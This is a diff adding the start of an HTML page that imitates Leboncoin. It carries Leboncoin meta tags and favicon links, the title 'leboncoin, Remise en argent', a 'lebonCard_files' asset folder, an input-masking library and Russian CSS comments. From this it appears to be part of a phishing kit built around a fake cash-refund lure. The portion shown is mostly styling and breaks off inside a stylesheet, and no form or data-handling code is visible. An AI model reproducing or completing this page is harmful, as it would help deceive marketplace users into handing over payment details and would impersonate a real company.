@@ -1,0 +1,4255 @@
+<html lang="fr" class=" gjhhofks idc0_347">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   
+   <style>
+/* Контейнер */
+.swal-modal {
+  border-radius: 10px !important;
+  padding: 25px 20px !important;
+  background-color: #ffffff !important;
+  font-family: "Segoe UI", Roboto, sans-serif !important;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1) !important;
+}
+
+/* Заголовок */
+.swal-title {
+  font-size: 20px !important;
+  font-weight: 600 !important;
+  color: #ff6f00 !important; /* LeBonCoin Orange */
+  margin-bottom: 10px !important;
+  text-align: center !important;
+}
+
+/* Текст */
+.swal-text {
+  font-size: 15px !important;
+  color: #444 !important;
+  line-height: 1.4 !important;
+  text-align: center !important;
+}
+
+/* Кнопки */
+.swal-button {
+  background-color: #ff6f00 !important;
+  color: white !important;
+  font-size: 14px !important;
+  font-weight: 500 !important;
+  border-radius: 6px !important;
+  padding: 8px 18px !important;
+  transition: background-color 0.3s ease !important;
+  box-shadow: none !important;
+}
+
+.swal-button:hover {
+  background-color: #e65c00 !important;
+}
+
+/* Иконка info */
+.swal-icon--info {
+  border-color: #ff6f00 !important;
+}
+.swal-icon--info:before, .swal-icon--info:after {
+  background-color: #ff6f00 !important;
+}
+.swal-icon--info .swal-icon--info__ring {
+  border: 4px solid #ff6f00 !important;
+}
+
+/* Иконка error */
+.swal-icon--error {
+  border-color: #d9534f !important;
+}
+.swal-icon--error__line {
+  background-color: #d9534f !important;
+}
+
+/* Центровка футера */
+.swal-footer {
+  text-align: center !important;
+  margin-top: 15px !important;
+}
+.support-circle {
+  background-color:#ff6f00 !important;
+}
+.btn-loader {
+  width: 18px;
+  height: 18px;
+  display: inline-block;
+  border: 2px solid white;
+  border-top: 2px solid transparent;
+  border-radius: 50%;
+  animation: spin 0.6s linear infinite;
+  vertical-align: middle;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+</style>
+
+    <style type="text/css">
+       
+
+        @-webkit-keyframes animateErrorIcon {
+            0% {
+                -webkit-transform: rotateX(100deg);
+                transform: rotateX(100deg);
+                opacity: 0
+            }
+
+            to {
+                -webkit-transform: rotateX(0deg);
+                transform: rotateX(0deg);
+                opacity: 1
+            }
+        }
+
+        @keyframes animateErrorIcon {
+            0% {
+                -webkit-transform: rotateX(100deg);
+                transform: rotateX(100deg);
+                opacity: 0
+            }
+
+            to {
+                -webkit-transform: rotateX(0deg);
+                transform: rotateX(0deg);
+                opacity: 1
+            }
+        }
+
+        @-webkit-keyframes animateXMark {
+            0% {
+                -webkit-transform: scale(.4);
+                transform: scale(.4);
+                margin-top: 26px;
+                opacity: 0
+            }
+
+            50% {
+                -webkit-transform: scale(.4);
+                transform: scale(.4);
+                margin-top: 26px;
+                opacity: 0
+            }
+
+            80% {
+                -webkit-transform: scale(1.15);
+                transform: scale(1.15);
+                margin-top: -6px
+            }
+
+            to {
+                -webkit-transform: scale(1);
+                transform: scale(1);
+                margin-top: 0;
+                opacity: 1
+            }
+        }
+
+        @keyframes animateXMark {
+            0% {
+                -webkit-transform: scale(.4);
+                transform: scale(.4);
+                margin-top: 26px;
+                opacity: 0
+            }
+
+            50% {
+                -webkit-transform: scale(.4);
+                transform: scale(.4);
+                margin-top: 26px;
+                opacity: 0
+            }
+
+            80% {
+                -webkit-transform: scale(1.15);
+                transform: scale(1.15);
+                margin-top: -6px
+            }
+
+            to {
+                -webkit-transform: scale(1);
+                transform: scale(1);
+                margin-top: 0;
+                opacity: 1
+            }
+        }
+
+      
+
+        @-webkit-keyframes pulseWarning {
+            0% {
+                border-color: #f8d486
+            }
+
+            to {
+                border-color: #f8bb86
+            }
+        }
+
+        @keyframes pulseWarning {
+            0% {
+                border-color: #f8d486
+            }
+
+            to {
+                border-color: #f8bb86
+            }
+        }
+
+     
+
+        @-webkit-keyframes rotatePlaceholder {
+            0% {
+                -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg)
+            }
+
+            5% {
+                -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg)
+            }
+
+            12% {
+                -webkit-transform: rotate(-405deg);
+                transform: rotate(-405deg)
+            }
+
+            to {
+                -webkit-transform: rotate(-405deg);
+                transform: rotate(-405deg)
+            }
+        }
+
+        @keyframes rotatePlaceholder {
+            0% {
+                -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg)
+            }
+
+            5% {
+                -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg)
+            }
+
+            12% {
+                -webkit-transform: rotate(-405deg);
+                transform: rotate(-405deg)
+            }
+
+            to {
+                -webkit-transform: rotate(-405deg);
+                transform: rotate(-405deg)
+            }
+        }
+
+        @-webkit-keyframes animateSuccessTip {
+            0% {
+                width: 0;
+                left: 1px;
+                top: 19px
+            }
+
+            54% {
+                width: 0;
+                left: 1px;
+                top: 19px
+            }
+
+            70% {
+                width: 50px;
+                left: -8px;
+                top: 37px
+            }
+
+            84% {
+                width: 17px;
+                left: 21px;
+                top: 48px
+            }
+
+            to {
+                width: 25px;
+                left: 14px;
+                top: 45px
+            }
+        }
+
+        @keyframes animateSuccessTip {
+            0% {
+                width: 0;
+                left: 1px;
+                top: 19px
+            }
+
+            54% {
+                width: 0;
+                left: 1px;
+                top: 19px
+            }
+
+            70% {
+                width: 50px;
+                left: -8px;
+                top: 37px
+            }
+
+            84% {
+                width: 17px;
+                left: 21px;
+                top: 48px
+            }
+
+            to {
+                width: 25px;
+                left: 14px;
+                top: 45px
+            }
+        }
+
+        @-webkit-keyframes animateSuccessLong {
+            0% {
+                width: 0;
+                right: 46px;
+                top: 54px
+            }
+
+            65% {
+                width: 0;
+                right: 46px;
+                top: 54px
+            }
+
+            84% {
+                width: 55px;
+                right: 0;
+                top: 35px
+            }
+
+            to {
+                width: 47px;
+                right: 8px;
+                top: 38px
+            }
+        }
+
+        @keyframes animateSuccessLong {
+            0% {
+                width: 0;
+                right: 46px;
+                top: 54px
+            }
+
+            65% {
+                width: 0;
+                right: 46px;
+                top: 54px
+            }
+
+            84% {
+                width: 55px;
+                right: 0;
+                top: 35px
+            }
+
+            to {
+                width: 47px;
+                right: 8px;
+                top: 38px
+            }
+        }
+
+     
+
+        @-webkit-keyframes swal-loading-anim {
+            0% {
+                opacity: .4
+            }
+
+            20% {
+                opacity: .4
+            }
+
+            50% {
+                opacity: 1
+            }
+
+            to {
+                opacity: .4
+            }
+        }
+
+        @keyframes swal-loading-anim {
+            0% {
+                opacity: .4
+            }
+
+            20% {
+                opacity: .4
+            }
+
+            50% {
+                opacity: 1
+            }
+
+            to {
+                opacity: .4
+            }
+        }
+
+       
+
+        @media (max-width:500px) {
+            
+        }
+
+        @-webkit-keyframes showSweetAlert {
+            0% {
+                -webkit-transform: scale(1);
+                transform: scale(1)
+            }
+
+            1% {
+                -webkit-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            45% {
+                -webkit-transform: scale(1.05);
+                transform: scale(1.05)
+            }
+
+            80% {
+                -webkit-transform: scale(.95);
+                transform: scale(.95)
+            }
+
+            to {
+                -webkit-transform: scale(1);
+                transform: scale(1)
+            }
+        }
+
+        @keyframes showSweetAlert {
+            0% {
+                -webkit-transform: scale(1);
+                transform: scale(1)
+            }
+
+            1% {
+                -webkit-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            45% {
+                -webkit-transform: scale(1.05);
+                transform: scale(1.05)
+            }
+
+            80% {
+                -webkit-transform: scale(.95);
+                transform: scale(.95)
+            }
+
+            to {
+                -webkit-transform: scale(1);
+                transform: scale(1)
+            }
+        }
+    </style>
+
+    <meta name="title" content="Leboncoin">
+    <meta name="description"
+        content="Leboncoin | Service de sélection d&#39;annonces dans votre pays - achat/vente de biens neufs et d&#39;occasion.">
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://leboncoin.fr/">
+    <meta property="og:title" content="Leboncoin">
+    <meta property="og:description"
+        content="Leboncoin | Service de sélection d&#39;annonces dans votre pays - achat/vente de biens neufs et d&#39;occasion.">
+    <meta property="og:image" content="">
+
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://leboncoin.fr/">
+    <meta property="twitter:title" content="Leboncoin">
+    <meta property="twitter:description"
+        content="Leboncoin | Service de sélection d&#39;annonces dans votre pays - achat/vente de biens neufs et d&#39;occasion.">
+    <meta property="twitter:image" content="">
+  <link rel="shortcut icon" href="https://www.leboncoin.fr/_next/static/media/favicon.2b8b94c9.ico" type="image/x-icon">
+
+
+
+    <title>leboncoin, Remise en argent</title>
+    <meta name="theme-color" content="#ffffff">
+    <meta property="og:locale" content="fr_FR">
+    <meta property="og:site_name" content="leboncoin">
+    <meta name="twitter:site" content="leboncoin">
+    <meta name="viewport" content="initial-scale=1.0, width=device-width, maximum-scale=1.0, user-scalable=0">
+    <link rel="icon" type="image/x-icon"
+        href="https://i.ibb.co/ZRnTPvVb/image.png">
+    <link rel="stylesheet" href="/css/support_parent.css" />
+
+    <script src="/lebonCard_files/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+        crossorigin="anonymous"></script>
+    <link href="/lebonCard_files/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <script src="/lebonCard_files/bootstrap.bundle.min.js"
+        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+        crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/popper.min.js"
+        integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
+        crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/bootstrap.min.js"
+        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+        crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/jquery.mask.js"></script>
+
+
+    <style>
+        body,
+        html {
+            min-width: 320px;
+        }
+
+        ._1Y-5- {
+            display: none !important;
+        }
+
+        html {
+            font-family: Open Sans, sans-serif, Arial;
+            font-size: 62.5%;
+            font-size: calc(1em * .625 + 0%);
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+        }
+
+        html {
+            box-sizing: border-box;
+        }
+
+        html {
+            font-family: sans-serif;
+        }
+
+        * {
+            box-sizing: inherit;
+        }
+
+        body {
+            margin: 0;
+        }
+
+        body {
+            font-size: 1.3em;
+            color: #1a1a1a;
+            line-height: 1.5;
+        }
+
+        @media (min-width: 481px) {
+            ._1gbif {
+                background: #fff;
+            }
+        }
+
+        ._1gbif {
+            background: transparent;
+            display: flex;
+            position: relative;
+        }
+
+        ._1LfpU {
+            min-height: 100vh;
+        }
+
+        ._3b19Z {
+            -webkit-box-flex: 1;
+            display: flex;
+            flex: 1 1;
+            flex-direction: column;
+            max-width: 100%;
+        }
+
+        .gKqnCl {
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+            position: sticky;
+            z-index: 1100;
+            background-color: rgb(255, 255, 255);
+            top: -0.1rem;
+        }
+
+        article,
+        aside,
+        details,
+        figcaption,
+        figure,
+        footer,
+        header,
+        hgroup,
+        main,
+        menu,
+        nav,
+        section,
+        summary {
+            display: block;
+        }
+
+        .fAOruB {
+            max-width: 1066px;
+            margin: 0px auto;
+            padding: 0px 1.6rem;
+            display: flex;
+            column-gap: 0.8rem;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            -moz-box-align: center;
+            align-items: center;
+            flex-wrap: wrap;
+            position: relative;
+        }
+
+        .jzWJHY {
+            -moz-box-align: center;
+            align-items: center;
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            padding-bottom: 1.6rem;
+            padding-top: 1.6rem;
+            width: 100%;
+        }
+
+        @media screen and (min-width: 793px) {
+            .jzWJHY {
+                display: none;
+            }
+        }
+
+        .P4PEa {
+            line-height: 1.9rem;
+        }
+
+        ._3j0OU {
+            font-weight: 400;
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        ._2adxl {
+            margin-left: auto;
+        }
+
+        ._282XL {
+            margin-right: auto;
+        }
+
+        ._137P- {
+            font-size: 1.4rem;
+        }
+
+        a,
+        button,
+        input,
+        label,
+        select,
+        summary,
+        textarea {
+            touch-action: manipulation;
+        }
+
+        a {
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        a {
+            color: #333;
+        }
+
+        a {
+            background-color: transparent;
+        }
+
+        svg:not(:root) {
+            overflow: hidden;
+        }
+
+        .kZINAN {
+            width: 1.6rem;
+            height: 1.6rem;
+            min-width: 1.6rem;
+            fill: rgb(26, 26, 26);
+            color: rgb(26, 26, 26);
+        }
+
+        .gqkqEu {
+            -moz-box-align: center;
+            align-items: center;
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            padding-bottom: 1.6rem;
+            padding-top: 1.6rem;
+            width: 100%;
+        }
+
+        @media (min-width: 300px) and (max-width: 792px) {
+            .gqkqEu {
+                display: none;
+            }
+        }
+
+        .GEtdv {
+            display: flex;
+            flex: 1 1 0%;
+        }
+
+        svg:not(:root) {
+            overflow: hidden;
+        }
+
+        .ctZyiq {
+            width: 2.4rem;
+            height: 2.4rem;
+            min-width: 2.4rem;
+            vertical-align: middle;
+            margin-right: 0.8rem;
+            fill: rgb(255, 110, 20);
+            color: rgb(255, 110, 20);
+        }
+
+        .ctZyiq {
+            fill: rgb(255, 110, 20);
+            color: rgb(255, 110, 20);
+        }
+
+        ._3Wx6b {
+            display: inline-block;
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        ._3Ce01 {
+            color: #ff6e14;
+        }
+
+        ._3k87M {
+            margin-right: .8rem;
+        }
+
+        @media (min-width: 971px) {
+            .Q9ISj {
+                display: none !important;
+            }
+        }
+
+        figure,
+        ol,
+        p,
+        ul {
+            margin: 0;
+            margin-top: 0px;
+        }
+
+        .p-like,
+        blockquote,
+        caption,
+        details,
+        dl,
+        figure,
+        label,
+        ol,
+        p,
+        pre,
+        td,
+        textarea,
+        th,
+        ul {
+            margin-top: .75em;
+            margin-bottom: 0;
+            line-height: 1.5;
+        }
+
+        a {
+            cursor: pointer;
+        }
+
+        ._21rqc {
+            display: flex;
+        }
+
+        ._3QJkO {
+            align-items: center;
+        }
+
+        .P4PEa {
+            line-height: 1.9rem;
+        }
+
+        ._137P- {
+            font-size: 1.4rem;
+        }
+
+        .hQcGor {
+            display: flex;
+            -moz-box-align: center;
+            align-items: center;
+            -moz-box-pack: center;
+            justify-content: center;
+            flex: 2 1 0%;
+        }
+
+        .hoqfsX {
+            max-width: 14rem;
+        }
+
+        .duXTlC {
+            border-left: medium solid rgb(255, 110, 20);
+            height: calc(3.6rem);
+            margin: 0px 0.8rem;
+        }
+
+        .htznVN {
+            width: 2.4rem;
+            height: 2.4rem;
+            min-width: 2.4rem;
+            fill: rgb(255, 110, 20);
+            color: rgb(255, 110, 20);
+        }
+
+        .ipkIET {
+            display: block;
+            flex: 1 1 0%;
+        }
+
+        .PJKhj {
+            display: none;
+        }
+
+        @media (min-width: 971px) {
+            .PJKhj {
+                display: block;
+                width: 70%;
+                position: absolute;
+                bottom: 0px;
+                right: 0px;
+                z-index: 0;
+            }
+        }
+
+        .fihASDafy {
+            z-index: 1;
+        }
+
+        .SNCEdaw {
+            width: 100%;
+            max-width: 1066px;
+            margin: 0px auto;
+        }
+
+        .jngirtD {
+            display: block;
+            margin-top: 0.8rem;
+            padding: 0.8rem;
+            width: 100%;
+        }
+
+        @media (min-width: 793px) {
+            .jngirtD {
+                margin-top: 1.5rem;
+                grid-template-columns: 66.7% 1fr;
+                grid-template-rows: 5.4rem 1fr;
+                grid-template-areas: "Title .    " "Form  Summary" "Form  Summary" "Form  .    ";
+                gap: 2.4rem;
+            }
+        }
+
+        .fnh4hbfi {
+            grid-area: Title;
+        }
+
+        @media (min-width: 793px) {
+            .fnh4hbfi {
+                margin-bottom: 0.8rem;
+                display: block;
+            }
+        }
+
+        @media (min-width: 793px) {
+            ._3zIi4 {
+                font-size: 2.4rem;
+            }
+        }
+
+        ._2-a8M {
+            line-height: 2.6rem;
+        }
+
+        ._35DXM {
+            font-weight: 600;
+        }
+
+        ._2QVPN {
+            font-size: 2rem;
+        }
+
+        .h1-like,
+        h1 {
+            font-size: 2rem;
+            font-weight: 600;
+        }
+
+        h1 {
+            font-size: 2em;
+            margin: .67em 0;
+            margin-top: 0.67em;
+            margin-bottom: 0.67em;
+        }
+
+        .HlrAk {
+            margin-bottom: .8rem;
+        }
+
+        ._1rwR5 {
+            margin-top: 1.8rem;
+        }
+
+        .h2-like,
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+        }
+
+        .eHWKLk {
+            grid-area: Summary;
+            order: 2;
+        }
+
+        .kGknfw {
+            margin-bottom: 1.6rem;
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+            border-radius: 0.8rem;
+            background-color: rgb(255, 255, 255);
+            overflow: hidden;
+        }
+
+        .ePtzTu {
+            -moz-box-align: center;
+            align-items: center;
+            display: flex;
+            border-bottom: 0.1rem solid rgb(230, 235, 239);
+        }
+
+        .TTQRb {
+            position: relative;
+            display: flex;
+            -moz-box-align: center;
+            align-items: center;
+            -moz-box-pack: center;
+            justify-content: center;
+            overflow: hidden;
+            min-width: auto;
+            min-height: auto;
+            width: 8rem;
+            height: 8rem;
+            border-top-left-radius: 0.4rem;
+            background-color: rgb(254, 240, 233);
+        }
+
+        .TTQRb img {
+            display: initial;
+            position: absolute;
+            inset: 0px;
+            margin: auto;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center center;
+        }
+
+        img:not([src$=".svg"]) {
+            height: auto;
+        }
+
+        ._1cnjm,
+        ._29Lk0,
+        ._2JtY0 {
+            display: inline-block;
+            font-size: 0;
+            line-height: 0;
+            vertical-align: middle;
+        }
+
+        blockquote,
+        code,
+        img,
+        input,
+        pre,
+        table,
+        td,
+        textarea,
+        video {
+            max-width: 100%;
+        }
+
+        img {
+            vertical-align: middle;
+        }
+
+        img {
+            border: 0;
+        }
+
+        html {
+            font-family: Open Sans, sans-serif, Arial;
+            font-size: 62.5%;
+            font-size: calc(1em * .625 + 0%);
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .bhAERa {
+            -moz-box-align: center;
+            align-items: center;
+            align-self: stretch;
+            display: flex;
+            flex: 1 1 0%;
+            flex-wrap: wrap;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            padding: 1.6rem 1.6rem 1.6rem 0.8rem;
+            padding-left: 0.8rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .bhAERa {
+                padding-left: 1.6rem;
+            }
+        }
+
+        blockquote:first-child,
+        dl:first-child,
+        h1:first-child,
+        h2:first-child,
+        h3:first-child,
+        h4:first-child,
+        h5:first-child,
+        h6:first-child,
+        ol:first-child,
+        p:first-child,
+        pre:first-child,
+        ul:first-child {
+            margin-top: 0;
+        }
+
+        .bxqkrI {
+            display: flex;
+            flex-direction: row;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            -moz-box-align: center;
+            align-items: center;
+            flex-basis: 100%;
+        }
+
+        ._137P- {
+            font-size: 1.4rem;
+        }
+
+        ._23jKN {
+            margin-right: 1.6rem;
+        }
+
+        ._2DyF8 {
+            white-space: nowrap;
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        ._3Ce01 {
+            color: #ff6e14;
+        }
+
+        .cJtdT {
+            line-height: 1.7rem;
+        }
+
+        .Dqdzf {
+            font-size: 1.2rem;
+        }
+
+        .hzWuVa {
+            padding: 1.6rem;
+        }
+
+        .PvZen {
+            vertical-align: middle;
+            display: block;
+            flex-flow: column nowrap;
+            #height: 100%;
+            box-sizing: border-box;
+            margin-top: 1.6rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .jzpWwx {
+            flex: 1 1 0%;
+        }
+
+        .kMxULx {
+            display: block;
+            vertical-align: middle;
+            margin: 0px;
+        }
+
+        .epBTZG {
+            display: inline-flex;
+            position: relative;
+            cursor: pointer;
+            margin: 0.6rem 0px;
+            width: 100%;
+            align-items: flex-start;
+            padding-right: 0px;
+        }
+
+        label {
+            display: inline-block;
+            vertical-align: middle;
+            cursor: pointer;
+        }
+
+        button,
+        input,
+        label,
+        select {
+            vertical-align: middle;
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .jhHMpi {
+            height: 2rem;
+            width: 2rem;
+            flex: 0 0 2rem;
+            position: relative;
+            display: inline-block;
+            margin: 0.2rem;
+            vertical-align: top;
+        }
+
+        .epBTZG {
+            cursor: pointer;
+        }
+
+        input[type="checkbox"],
+        input[type="radio"] {
+            box-sizing: border-box;
+            padding: 0;
+        }
+
+        .kXAiEc {
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            height: 100%;
+            width: 100%;
+            vertical-align: top;
+            opacity: 0;
+        }
+
+        input {
+            line-height: normal;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: #1a1a1a;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: inherit;
+            font: inherit;
+            font-size: inherit;
+            line-height: inherit;
+            font-family: inherit;
+            margin: 0;
+        }
+
+        .p-like,
+        blockquote,
+        caption,
+        details,
+        dl,
+        figure,
+        label,
+        ol,
+        p,
+        pre,
+        td,
+        textarea,
+        th,
+        ul {
+            line-height: 1.5;
+        }
+
+        .dMmgxv::before {
+            transition: width 0.2s ease 0s, height 0.2s ease 0s;
+            content: "";
+            display: block;
+            background-color: rgb(255, 110, 20);
+            height: 0px;
+            width: 0px;
+            border-radius: 50%;
+        }
+
+        .HlrAk {
+            margin-bottom: .8rem;
+        }
+
+        ._1rwR5 {
+            margin-top: 1.8rem;
+        }
+
+        .h2-like,
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+        }
+
+        .eHWKLk {
+            grid-area: Summary;
+            order: 2;
+        }
+
+        .kGknfw {
+            margin-bottom: 1.6rem;
+            box-shadow: rgba(26, 26, 26, 0.08) 0px -1px 4px 0px, rgba(26, 26, 26, 0.12) 0px 4px 8px 0px;
+            border-radius: 0.8rem;
+            background-color: rgb(255, 255, 255);
+            overflow: hidden;
+        }
+
+        .ePtzTu {
+            -moz-box-align: center;
+            align-items: center;
+            display: flex;
+            border-bottom: 0.1rem solid rgb(230, 235, 239);
+        }
+
+        .TTQRb {
+            position: relative;
+            display: flex;
+            -moz-box-align: center;
+            align-items: center;
+            -moz-box-pack: center;
+            justify-content: center;
+            overflow: hidden;
+            min-width: auto;
+            min-height: auto;
+            width: 8rem;
+            height: 8rem;
+            border-top-left-radius: 0.4rem;
+            background-color: rgb(254, 240, 233);
+        }
+
+        .TTQRb img {
+            display: initial;
+            position: absolute;
+            inset: 0px;
+            margin: auto;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center center;
+        }
+
+        img:not([src$=".svg"]) {
+            height: auto;
+        }
+
+        ._1cnjm,
+        ._29Lk0,
+        ._2JtY0 {
+            display: inline-block;
+            font-size: 0;
+            line-height: 0;
+            vertical-align: middle;
+        }
+
+        blockquote,
+        code,
+        img,
+        input,
+        pre,
+        table,
+        td,
+        textarea,
+        video {
+            max-width: 100%;
+        }
+
+        img {
+            vertical-align: middle;
+        }
+
+        img {
+            border: 0;
+        }
+
+        html {
+            font-family: Open Sans, sans-serif, Arial;
+            font-size: 62.5%;
+            font-size: calc(1em * .625 + 0%);
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .bhAERa {
+            -moz-box-align: center;
+            align-items: center;
+            align-self: stretch;
+            display: flex;
+            flex: 1 1 0%;
+            flex-wrap: wrap;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            padding: 1.6rem 1.6rem 1.6rem 0.8rem;
+            padding-left: 0.8rem;
+        }
+
+        @media screen and (min-width: 793px) {
+            .bhAERa {
+                padding-left: 1.6rem;
+            }
+        }
+
+        blockquote:first-child,
+        dl:first-child,
+        h1:first-child,
+        h2:first-child,
+        h3:first-child,
+        h4:first-child,
+        h5:first-child,
+        h6:first-child,
+        ol:first-child,
+        p:first-child,
+        pre:first-child,
+        ul:first-child {
+            margin-top: 0;
+        }
+
+        .bxqkrI {
+            display: flex;
+            flex-direction: row;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            -moz-box-align: center;
+            align-items: center;
+            flex-basis: 100%;
+        }
+
+        ._137P- {
+            font-size: 1.4rem;
+        }
+
+        ._23jKN {
+            margin-right: 1.6rem;
+        }
+
+        ._2DyF8 {
+            white-space: nowrap;
+        }
+
+        ._1-TTU {
+            line-height: 2.2rem;
+        }
+
+        ._1hnil {
+            font-size: 1.6rem;
+        }
+
+        ._3Ce01 {
+            color: #ff6e14;
+        }
+
+        .cJtdT {
+            line-height: 1.7rem;
+        }
+
+        .Dqdzf {
+            font-size: 1.2rem;
+        }
+
+        .hzWuVa {
+            padding: 1.6rem;
+        }
+
+        .PvZen {
+            vertical-align: middle;
+            display: block;
+            flex-flow: column nowrap;
+            #height: 100%;
+            box-sizing: border-box;
+            margin-top: 1.6rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .jzpWwx {
+            flex: 1 1 0%;
+        }
+
+        .kMxULx {
+            display: block;
+            vertical-align: middle;
+            margin: 0px;
+        }
+
+        .epBTZG {
+            display: inline-flex;
+            position: relative;
+            cursor: pointer;
+            margin: 0.6rem 0px;
+            width: 100%;
+            align-items: flex-start;
+            padding-right: 0px;
+        }
+
+        label {
+            display: inline-block;
+            vertical-align: middle;
+            cursor: pointer;
+        }
+
+        button,
+        input,
+        label,
+        select {
+            vertical-align: middle;
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .jhHMpi {
+            height: 2rem;
+            width: 2rem;
+            flex: 0 0 2rem;
+            position: relative;
+            display: inline-block;
+            margin: 0.2rem;
+            vertical-align: top;
+        }
+
+        .epBTZG {
+            cursor: pointer;
+        }
+
+        input[type="checkbox"],
+        input[type="radio"] {
+            box-sizing: border-box;
+            padding: 0;
+        }
+
+        .kXAiEc {
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            height: 100%;
+            width: 100%;
+            vertical-align: top;
+            opacity: 0;
+        }
+
+        input {
+            line-height: normal;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: #1a1a1a;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: inherit;
+            font: inherit;
+            font-size: inherit;
+            line-height: inherit;
+            font-family: inherit;
+            margin: 0;
+        }
+
+        .p-like,
+        blockquote,
+        caption,
+        details,
+        dl,
+        figure,
+        label,
+        ol,
+        p,
+        pre,
+        td,
+        textarea,
+        th,
+        ul {
+            line-height: 1.5;
+        }
+
+        .dMmgxv::before {
+            transition: width 0.2s ease 0s, height 0.2s ease 0s;
+            content: "";
+            display: block;
+            background-color: rgb(255, 110, 20);
+            height: 0px;
+            width: 0px;
+            border-radius: 50%;
+        }
+
+        .dMmgxv {
+            position: relative;
+            top: 0px;
+            left: 0px;
+            height: 100%;
+            width: 100%;
+            vertical-align: top;
+            display: inline-flex;
+            -moz-box-pack: center;
+            justify-content: center;
+            -moz-box-align: center;
+            align-items: center;
+            margin-left: 0.4rem;
+            background-color: rgb(255, 255, 255);
+            border-width: 0.2rem;
+            border-style: solid;
+            border-color: rgb(168, 180, 192);
+            border-radius: 50%;
+        }
+
+        label {
+            cursor: pointer;
+        }
+
+        button,
+        input,
+        label,
+        select {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        .kXAiEc:checked:not(:disabled)~.sc-bnXvFD::before {
+            width: 1rem;
+            height: 1rem;
+        }
+
+        .kXAiEc:checked:not(:disabled)~.sc-bnXvFD {
+            border-color: rgb(255, 110, 20);
+        }
+
+        .epBTZG .sc-gFaPwZ {
+            width: 100%;
+        }
+
+        .fMsPue {
+            display: inline-block;
+            vertical-align: top;
+            user-select: none;
+            margin-left: 0.8rem;
+        }
+
+        .fkEazy {
+            margin-bottom: 0.8rem;
+            transform: translateY(-0.4rem);
+        }
+
+        .fYkXta {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 0.4rem;
+        }
+
+        ._2k43C {
+            color: #8191a0;
+        }
+
+        figure,
+        ol,
+        p,
+        ul {
+            margin: 0;
+        }
+
+        .kMxULx:last-child {
+            margin: 0px;
+        }
+
+        _3QMDx {
+            vertical-align: top;
+        }
+
+        .iNBTHB {
+            width: 2rem;
+            height: 2rem;
+            min-width: 2rem;
+            margin-left: 0.8rem;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        ._2adxl {
+            margin-left: auto;
+        }
+
+        .ddRUJi {
+            display: flex;
+            -moz-box-pack: justify;
+            justify-content: space-between;
+            -moz-box-align: center;
+            align-items: center;
+            margin-bottom: 0.4rem;
+        }
+
+        .-HQxY {
+            margin-bottom: 0;
+        }
+
+        .bYnGfB {
+            display: block;
+            padding-top: 0.8rem;
+        }
+
+        ol,
+        ul {
+            padding: 0;
+            padding-top: 0px;
+            list-style-type: none;
+        }
+
+        .bBEOPH {
+            display: flex;
